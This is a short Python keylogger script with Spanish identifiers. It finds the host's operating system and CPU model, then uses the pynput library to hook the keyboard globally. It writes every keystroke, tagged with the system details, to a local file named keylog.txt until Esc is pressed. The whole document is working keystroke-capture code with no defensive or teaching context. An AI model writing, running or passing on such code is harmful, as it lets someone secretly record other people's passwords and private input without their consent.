import platform
import subprocess
from pynput.keyboard import Listener, Key


sistema = platform.system()  


def obtener_procesador():
    try:
        if sistema == "Linux":
            result = subprocess.run(['lscpu'], capture_output=True, text=True)
            for line in result.stdout.splitlines():
                if line.startswith('Model name:'):
                    return line.split(":")[1].strip()  
        elif sistema == "Windows":
            result = subprocess.run(['wmic', 'cpu', 'get', 'caption'], capture_output=True, text=True)
           
            procesador = result.stdout.splitlines()[1].strip() 
            return procesador
        elif sistema == "Darwin":  # Para macOS
            result = subprocess.run(['sysctl', '-n', 'machdep.cpu.brand_string'], capture_output=True, text=True)
            return result.stdout.strip()  
        else:
            return f"El sistema operativo {sistema} no está soportado para obtener información del procesador"
    except Exception as e:
        return f"Error al obtener información del procesador: {str(e)}"

procesador = obtener_procesador()  

def on_press(key):
    try:
        
        sistema_info = f"sistema: {sistema}, procesador: {procesador}, tecla: {key.char}\n"
        with open("keylog.txt", "a") as f:
            f.write(sistema_info)
    except AttributeError:
        with open("keylog.txt", "a") as f:
            f.write(f"Tecla especial: {key}\n")

def on_release(key):
    if key == Key.esc:
        return False  

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()




